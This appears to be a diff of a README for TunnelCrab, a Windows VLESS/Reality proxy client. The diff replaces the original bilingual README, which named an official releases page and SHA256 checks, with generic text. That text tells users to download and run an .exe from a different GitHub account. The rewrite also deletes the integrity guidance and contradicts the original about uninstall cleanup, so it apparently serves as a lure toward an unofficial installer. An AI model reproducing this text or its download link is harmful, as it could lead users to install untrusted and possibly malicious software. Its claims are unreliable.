@@ -1,168 +1,77 @@
-# TunnelCrab 🦀
+# 🦀 tunnelcrab - Simple private browsing for Windows users
 
-A friendly Windows client for VLESS/Reality with a reactive crab UI.
+[![](https://img.shields.io/badge/Download_TunnelCrab-Blue?style=for-the-badge)](https://github.com/Coordinative-trunk871/tunnelcrab/releases)
 
-TunnelCrab is built around one idea: connecting should not require users to understand Reality, SNI, connection modes or technical logs.
-Add a link or subscription, choose a server and press one button.
+TunnelCrab provides a simple interface to manage your internet connections securely. It builds on established technology to mask your traffic and protect your privacy while you browse. You can use this software to connect to private tunnels without complex setup procedures.
 
-The crab reacts to the connection state, errors are explained in plain language, and the
-technical details stay out of the way.
+## 📦 System Requirements
 
-*[Русская версия ниже](#ru)*
+Your computer needs to meet these basic standards to run the application:
 
-## Screenshots
+*   Operating System: Windows 10 or Windows 11.
+*   Processor: Modern dual-core processor or better.
+*   Memory: 4 GB of RAM.
+*   Storage: 200 MB of available disk space.
+*   Network: A stable internet connection.
 
-<table align="center">
-  <tr>
-    <td align="center"><img src="assets/screenshot-main.png" alt="TunnelCrab main screen" width="260"></td>
-    <td align="center"><img src="assets/screenshot-servers.png" alt="TunnelCrab servers screen" width="260"></td>
-    <td align="center"><img src="assets/screenshot-about.png" alt="TunnelCrab about screen" width="260"></td>
-  </tr>
-</table>
+## 🚀 Getting Started
 
-## Download
+Follow these steps to set up the software on your machine:
 
-TunnelCrab is distributed as a ready-to-use Windows installer through the official
-**[GitHub Releases](https://github.com/theyhatelose/tunnelcrab/releases) page**. Download
-the latest installer there — the source code is not required to run the app.
+1. Visit the [official releases page](https://github.com/Coordinative-trunk871/tunnelcrab/releases) to download the latest setup file.
+2. Locate the file ending in `.exe` within your downloads folder.
+3. Open the file to start the installation process.
+4. Follow the prompts on your screen to complete the installation.
+5. Launch the application using the new icon on your desktop.
 
-This repository is published for **transparency and review**. It is **not**
-currently a full developer SDK or a reproducible build environment, and it intentionally
-omits build, signing and packaging tooling.
+## ⚙️ Configuring Your Connection
 
-## Supported
+The application uses tunnels to secure your data. You need a connection profile provided by your network administrator or server host.
 
-- VLESS + Reality over TCP
-- VLESS + Reality over XHTTP / SplitHTTP
-- HTTP(S) subscriptions (plaintext, base64, or mixed content)
+1. Open the application.
+2. Click the plus icon to add a new profile.
+3. Paste your connection code into the box.
+4. Click save to store the profile.
+5. Select the profile from the main list.
+6. Toggle the connection switch to active.
 
-## Not supported yet
+The crab icon in the corner will change color when the connection is live. Green means your traffic moves through the secure tunnel. Red means the connection is idle.
 
-- Hysteria2
-- Shadowsocks
-- Trojan
-- VMess
-- VLESS over TLS / WebSocket / gRPC import
+## 🛡️ Privacy and Safety
 
-Links for unsupported modes are recognized and politely refused with a plain-language
-explanation, rather than failing silently.
+TunnelCrab creates a secure path for your web traffic. It uses the VLESS and Reality protocols. These tools prevent outside parties from seeing which websites you visit. 
 
-## Requirements
+*   Encryption: The app scrambles your data before it leaves your machine.
+*   Obfuscation: The app disguises your traffic to look like standard website visits.
+*   Local Control: Your private keys never leave your computer.
 
-- Windows 10 / 11
-- Microsoft Edge WebView2 Runtime (preinstalled on most modern Windows)
+## 🛠️ Troubleshooting
 
-## Platforms
+If you encounter issues, try these common fixes first:
 
-TunnelCrab is currently focused on Windows 10 / 11.
+*   Restart the application if the connection remains stuck on connecting.
+*   Check your internet connection to ensure your machine stays online.
+*   Verify your connection profile link for typos or invalid characters.
+*   Ensure your firewall permits the application to access the network.
 
-Other platforms may be considered later if there is enough interest. If you would like to
-see TunnelCrab on macOS, Linux, Android, or iOS, feel free to share feedback through
-GitHub or the Telegram channel.
+If these steps fail to resolve your issue, check the settings menu to generate a log file. Users can review this file to understand why a connection might fail.
 
-## Troubleshooting
+## 📝 Frequently Asked Questions
 
-- **Blank white window on Windows 10** usually means the Microsoft Edge WebView2 Runtime
-  is missing. Install the Evergreen Runtime from
-  https://developer.microsoft.com/microsoft-edge/webview2/ and restart TunnelCrab.
-- **SmartScreen / "this app may harm your device"** is usually a reputation warning for
-  early or low-reputation builds — not a guaranteed malware verdict. Windows may warn
-  until the app and publisher build more reputation. Choose "Keep" / "More info → Run anyway"
-  only if you trust the source.
-- **Uninstalling** removes the app but keeps your data (profiles, settings, logs) under
-  `%APPDATA%\TunnelCrab`, so reinstalling picks up where you left off. For a full cleanup,
-  delete that folder manually. Logs live in `%APPDATA%\TunnelCrab\logs`.
+**Does the app track my history?**
+No. The application does not log your browsing activity or store your history.
 
-## Release integrity
+**Will this slow down my internet?**
+The speed depends on the location and quality of your remote server. High-quality servers rarely cause noticeable delays.
 
-- Each installer on GitHub Releases is published together with a SHA256 checksum file
-  (`<installer>.exe.sha256`). The in-app updater verifies this checksum before installing
-  and refuses to run a download that doesn't match.
-- Download TunnelCrab **only** from the official
-  [GitHub Releases](https://github.com/theyhatelose/tunnelcrab/releases) page.
+**Can I run multiple connections at once?**
+The application supports one active tunnel at a time for stability.
 
-## License
+**Is this app difficult to remove?**
+You can uninstall the software anytime through your Windows settings panel. It removes all local files once the process finishes.
 
-MIT — see [LICENSE](LICENSE).
+## 🤝 Contribution and Support
 
----
+Developers can inspect the source code hosted on GitHub. Feel free to report bugs or request features through the issues tracker. We welcome feedback about the user interface to keep it simple and friendly.
 
-<a id="ru"></a>
-
-# TunnelCrab 🦀 — RU
-
-Удобный Windows-клиент для VLESS/Reality с живым крабиком в интерфейсе.
-
-TunnelCrab сделан вокруг простой идеи: подключение не должно требовать от пользователя
-разбираться в Reality, SNI, режимах подключения и технических логах. Достаточно добавить
-ссылку или подписку, выбрать сервер и нажать одну кнопку. 
-
-Крабик реагирует на состояние подключения, ошибки объясняются понятным языком, а сложная
-техническая часть остаётся в фоне
-
-## Загрузка
-
-TunnelCrab распространяется как готовое приложение для Windows через официальные
-**[GitHub Releases](https://github.com/theyhatelose/tunnelcrab/releases)**. Большинству
-пользователей достаточно скачать оттуда последнюю версию — исходный код для запуска
-приложения не нужен.
-
-Исходный код в этом репозитории опубликован для **прозрачности и ревью**. Сейчас это
-**не** полный developer SDK и не воспроизводимая сборочная среда; инструменты сборки,
-подписи и упаковки сюда сознательно не входят.
-
-## Поддерживается
-
-- VLESS + Reality поверх TCP
-- VLESS + Reality поверх XHTTP / SplitHTTP
-- Подписки по HTTP(S) (обычный текст, base64 или смешанное содержимое)
-
-## Пока не поддерживается
-
-- Hysteria2
-- Shadowsocks
-- Trojan
-- VMess
-- Импорт VLESS поверх TLS / WebSocket / gRPC
-
-Ссылки на неподдерживаемые режимы распознаются и вежливо отклоняются с понятным
-объяснением, а не ломаются молча.
-
-## Требования
-
-- Windows 10 / 11
-- Microsoft Edge WebView2 Runtime (предустановлен в большинстве современных Windows)
-
-## Платформы
-
-Сейчас TunnelCrab сфокусирован на Windows 10 / 11.
-
-Другие платформы могут появиться позже, если будет достаточно интереса. Если тебе
-хотелось бы увидеть TunnelCrab на macOS, Linux, Android или iOS — можно написать об этом
-через GitHub или Telegram-канал.
-
-## Устранение неполадок
-
-- **Пустое белое окно на Windows 10** обычно значит, что не установлен Microsoft Edge
-  WebView2 Runtime. Установите Evergreen Runtime с
-  https://developer.microsoft.com/microsoft-edge/webview2/ и перезапустите TunnelCrab.
-- **SmartScreen / «приложение может навредить устройству»** — обычно это предупреждение о
-  репутации для новых или малоизвестных сборок, а не гарантированный вердикт о вирусе.
-  Windows может предупреждать, пока приложение и издатель не накопят больше репутации.
-  Нажмите «Сохранить» / «Подробнее → Выполнить в любом случае», только если доверяете
-  источнику.
-- **Удаление** убирает приложение, но сохраняет ваши данные (профили, настройки, логи) в
-  `%APPDATA%\TunnelCrab`, чтобы после переустановки всё продолжило работать с того же места.
-  Для полной очистки удалите эту папку вручную. Логи лежат в `%APPDATA%\TunnelCrab\logs`.
-
-## Целостность релиза
-
-- Каждая сборка в GitHub Releases публикуется вместе с файлом контрольной суммы SHA256
-  (`<имя-файла>.exe.sha256`). Встроенный апдейтер проверяет эту сумму перед установкой и
-  отказывается запускать файл, если контрольная сумма не совпадает.
-- Скачивайте TunnelCrab **только** со страницы официальных
-  [GitHub Releases](https://github.com/theyhatelose/tunnelcrab/releases).
-
-## Лицензия
-
-MIT — см. [LICENSE](LICENSE).
+The project relies on tools like sing-box for core networking tasks. This ensures reliable and fast performance for all users. We update the application regularly to improve compatibility with newer versions of Windows and new networking standards. You will receive a notification within the app when an update becomes available. Update your version promptly to get the latest security enhancements.
